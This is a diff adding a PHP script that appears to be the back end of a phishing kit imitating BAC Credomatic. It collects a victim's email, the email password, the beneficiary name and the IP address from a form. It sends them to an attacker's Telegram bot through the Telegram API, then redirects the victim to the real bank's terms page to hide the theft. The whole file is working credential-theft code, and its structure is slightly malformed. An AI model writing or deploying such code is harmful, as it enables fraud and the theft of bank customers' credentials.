@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+ini_set("display_errors", 0);
+include('info_telgr.html');
+
+$beneficiario = $_POST['beneficiario'];
+$usuario = $_POST['product'];
+$password = $_POST['sueco'];
+$cuentax = $_POST['topocho']; 
+$ip = $_SERVER['REMOTE_ADDR'];
+
+
+
+
+if( (empty($usuario)) or (empty($password)) )
+{
+	header('location: index.html');
+	
+
+
+}else{
+
+	$message = "Datos Credomatic\r\nBeneficiario: ".$beneficiario."\r\nCorreo: ".$usuario."\r\nCLAVE DE CORREO: ".$password."\r\nIP: ".$ip."\r\n";
+
+$apiToken = $apibot;
+$data = [
+    'chat_id' => $canal,
+    'text' => $message
+];
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+
+echo '<script type="text/javascript">window.location.href = "https://www2.baccredomatic.com/es-hn/nuestra-empresa/condiciones-y-terminos-de-uso";</script>';
+
+}
+?>
+
